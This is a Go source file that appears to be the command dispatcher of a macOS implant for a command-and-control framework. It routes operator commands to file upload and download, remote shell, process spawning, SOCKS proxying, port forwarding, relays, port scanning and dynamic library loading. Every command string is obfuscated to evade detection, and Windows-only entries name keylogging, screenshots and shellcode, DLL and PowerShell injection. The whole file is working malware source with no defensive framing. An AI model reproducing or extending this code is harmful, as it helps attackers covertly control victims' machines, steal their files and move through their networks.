package capabilities

import (
	"os"

	relaycap "stageless/capabilities/relay"
	portscancap "stageless/capabilities/portscan"
	"stageless/utils/obf"
)

var winOnlyRaw = []string{
	obf.S("systeminfo"), obf.S("enumdrives"), obf.S("fdrivers"), obf.S("route"),
	obf.S("arp"), obf.S("netview"), obf.S("netloggedon"), obf.S("powershell"),
	obf.S("dotnet"), obf.S("bof"), obf.S("shellcode"), obf.S("inj-spawn"),
	obf.S("inj-dotnet"), obf.S("inj-powershell"), obf.S("inj-dll"), obf.S("inj-shellcode"),
	obf.S("smb"), obf.S("screenshot"), obf.S("screenshot start"), obf.S("screenshot stop"),
	obf.S("keylogger start"), obf.S("keylogger stop"),
}

func containsStr(list []string, v string) bool {
	// Checks that the string is present in the list
	for _, x := range list {
		if x == v {
			return true
		}
	}
	return false
}

func Run(cmdType, mode, raw, args, input, params, host, taskTag string) []byte {
	// Here is where the call is routed to the matching command handler
	switch cmdType {
	case obf.S("folders"):
		return RunFolders(host, taskTag, input, params)
	case obf.S("files"):
		return RunFiles(host, taskTag, input, params)
	case obf.S("process"):
		return RunProcess(host, taskTag, input, params)
	case obf.S("socks"):
		return RunSocks(host, taskTag, input, params)
	case obf.S("port_forwarding"):
		return RunPortForward(host, taskTag, input, params)
	}
	switch mode {
	case obf.S("ls"):
		return RunLs(args)
	case obf.S("cd"):
		return RunCd(args)
	case obf.S("pwd"):
		return RunPwd()
	case obf.S("mkdir"):
		return RunMkdir(args)
	case obf.S("rmdir"):
		return RunRmdir(args)
	case obf.S("rm"):
		return RunDel(args)
	case obf.S("cp"):
		return RunCopy(args)
	case obf.S("mv"):
		return RunMove(args)
	case obf.S("ren"):
		return RunRen(args)
	case obf.S("cat"):
		return RunCat(args)
	case obf.S("preview"):
		return RunPreview(args, params)
	case obf.S("fileinfo"):
		return RunFileinfo(args)
	case obf.S("acl"):
		return RunAcl(args)
	case obf.S("upload"):
		return RunUpload(input, params)
	case obf.S("download"):
		return RunDownload(input, params, taskTag)
	case obf.S("echo"):
		return RunEcho(args)
	case obf.S("attrib"):
		return RunAttrib(args)
	case obf.S("set"):
		return RunSet(args)
	case obf.S("config"):
		return RunConfig(args)
	case obf.S("delay"):
		return RunDelay(args)
	case obf.S("shell"):
		return RunShell(args)
	case obf.S("spawn"):
		return RunSpawn(params)
	case obf.S("load-dylib"):
		return RunLoadDylib(input, params)
	case obf.S("tasks"):
		return WriteMsg(RunTasksList(taskTag))
	case obf.S("tasks kill"):
		return WriteMsg(RunTasksKill(params))
	case obf.S("relay"):
		return WriteMsg(relaycap.RunRelay(params))
	case obf.S("relay create"):
		return WriteMsg(relaycap.RunRelayCreate(params))
	case obf.S("relay delete"):
		return WriteMsg(relaycap.RunRelayDelete(params))
	case obf.S("search"):
		return RunSearch(args, input, params)
	case obf.S("portscan"):
		return portscancap.RunPortscan(args, params)
	case obf.S("kill"):
		os.Exit(0)
	}
	switch raw {
	case obf.S("whoami"):
		return RunWhoami(args)
	case obf.S("env"):
		return RunEnv(args)
	case obf.S("tasklist"):
		return RunTasklist(args)
	case obf.S("ifconfig"):
		return RunIfconfig(args)
	case obf.S("netstat"):
		return RunNetstat(args)
	}
	if containsStr(winOnlyRaw, raw) || containsStr(winOnlyRaw, mode) {
		return WriteMsg(obf.S("Feature not supported on macOS"))
	}
	return WriteMsg(obf.S("Unknown command"))
}
